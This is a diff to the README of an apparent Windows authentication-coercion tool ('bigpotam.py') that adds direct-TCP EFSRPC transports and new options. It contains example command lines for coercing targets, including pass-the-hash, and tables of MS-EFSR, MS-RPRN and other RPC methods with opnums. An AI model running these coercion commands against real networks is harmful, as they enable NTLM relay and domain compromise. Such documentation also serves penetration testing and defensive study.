@@ -29,6 +29,9 @@ python3 bigpotam.py domain/user:password@target 10.0.0.5 -method EfsRpcEncryptFi
 # Try all EFSR named pipes (not just lsarpc/efsrpc)
 python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -all-pipes
 
+# Force EFSRPC over direct TCP using the port from rpcdump output
+python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -pipe tcp_efsr -tcp-port 49664
+
 # Pass-the-hash
 python3 bigpotam.py domain/user@target 10.0.0.5 -hashes :aad3b435b51404eeaad3b435b51404ee
 
@@ -51,7 +54,9 @@ coercion:
   -method             Specific method name
   -protocol           Limit to one protocol
   -all                Try all methods even after success
-  -all-pipes          Try all EFSR named pipes per method
+  -all-pipes          Try all EFSR transports per method
+  -pipe               MS-EFSR pipe/transport override
+  -tcp-port           RPC TCP port for EFSR tcp_* transports
 
 authentication:
   -hashes             LMHASH:NTHASH
@@ -73,7 +78,7 @@ output:
 
 | Protocol | Methods | Pipe / Transport | WebDAV |
 |----------|---------|-------------------|--------|
-| MS-EFSR | 11 functions | lsarpc, efsrpc, samr, lsass, netlogon | Yes |
+| MS-EFSR | 11 functions | lsarpc, efsrpc, samr, lsass, netlogon, tcp_lsarpc, tcp_efsr | Yes |
 | MS-RPRN | 3 methods | spoolss / dcerpc | Yes |
 | MS-PAR | 1 method | spoolss | No |
 | MS-DFSNM | 6 functions | netdfs | Partial |
@@ -86,17 +91,17 @@ output:
 
 | # | Protocol | Method | Opnum | Pipe | Notes |
 |---|----------|--------|-------|------|-------|
-| 1 | MS-EFSR | EfsRpcEncryptFileSrv | 4 | lsarpc/efsrpc | |
-| 2 | MS-EFSR | EfsRpcDecryptFileSrv | 5 | lsarpc/efsrpc | |
-| 3 | MS-EFSR | EfsRpcQueryUsersOnFile | 6 | lsarpc/efsrpc | |
-| 4 | MS-EFSR | EfsRpcQueryRecoveryAgents | 7 | lsarpc/efsrpc | |
-| 5 | MS-EFSR | EfsRpcRemoveUsersFromFile | 8 | lsarpc/efsrpc | |
-| 6 | MS-EFSR | EfsRpcAddUsersToFile | 9 | lsarpc/efsrpc | |
-| 7 | MS-EFSR | EfsRpcFileKeyInfo | 12 | lsarpc/efsrpc | |
-| 8 | MS-EFSR | EfsRpcDuplicateEncryptionInfoFile | 13 | lsarpc/efsrpc | |
-| 9 | MS-EFSR | EfsRpcAddUsersToFileEx | 15 | lsarpc/efsrpc | |
-| 10 | MS-EFSR | EfsRpcFileKeyInfoEx | 16 | lsarpc/efsrpc | |
-| 11 | MS-EFSR | EfsRpcOpenFileRaw | 0 | lsarpc/efsrpc | Patched — tried last |
+| 1 | MS-EFSR | EfsRpcEncryptFileSrv | 4 | lsarpc/efsrpc/tcp_* | |
+| 2 | MS-EFSR | EfsRpcDecryptFileSrv | 5 | lsarpc/efsrpc/tcp_* | |
+| 3 | MS-EFSR | EfsRpcQueryUsersOnFile | 6 | lsarpc/efsrpc/tcp_* | |
+| 4 | MS-EFSR | EfsRpcQueryRecoveryAgents | 7 | lsarpc/efsrpc/tcp_* | |
+| 5 | MS-EFSR | EfsRpcRemoveUsersFromFile | 8 | lsarpc/efsrpc/tcp_* | |
+| 6 | MS-EFSR | EfsRpcAddUsersToFile | 9 | lsarpc/efsrpc/tcp_* | |
+| 7 | MS-EFSR | EfsRpcFileKeyInfo | 12 | lsarpc/efsrpc/tcp_* | |
+| 8 | MS-EFSR | EfsRpcDuplicateEncryptionInfoFile | 13 | lsarpc/efsrpc/tcp_* | |
+| 9 | MS-EFSR | EfsRpcAddUsersToFileEx | 15 | lsarpc/efsrpc/tcp_* | |
+| 10 | MS-EFSR | EfsRpcFileKeyInfoEx | 16 | lsarpc/efsrpc/tcp_* | |
+| 11 | MS-EFSR | EfsRpcOpenFileRaw | 0 | lsarpc/efsrpc/tcp_* | Patched — tried last |
 | 12 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification | 62 | spoolss | |
 | 13 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | spoolss | |
 | 14 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | dcerpc (EPM) | Dynamic TCP endpoint |
@@ -117,7 +122,7 @@ output:
 
 When `-all` is not set, methods are tried in this order (most reliable first):
 
-1. **MS-EFSR** via lsarpc/efsrpc — 11 functions, universally accessible pipe
+1. **MS-EFSR** via lsarpc/efsrpc — 11 functions, with optional direct TCP EFSRPC
 2. **MS-RPRN** via spoolss — PrinterBug (opnum 62 and 65)
 3. **MS-RPRN** via EPM/TCP — dynamic endpoint when spoolss pipe is blocked
 4. **MS-PAR** — RpcAsyncOpenPrinter
@@ -142,7 +147,7 @@ When `-all` is not set, methods are tried in this order (most reliable first):
 - **MS-WSP** uses `file:////listener/share` with forward slashes
 - **DCOM UpdateSession** connects via port 135/DCOM, not named pipes — coerces the **machine account**
 - **MS-RPRN** requires `RpcOpenPrinter` handle before calling notification functions
-- **EFSR UUID varies by pipe**: `efsrpc` pipe uses `df1941c5-...`, all others use `c681d488-...`
+- **EFSR UUID varies by transport**: `efsrpc` and `tcp_efsr` use `df1941c5-...`, all others use `c681d488-...`
 
 ## Credits
 
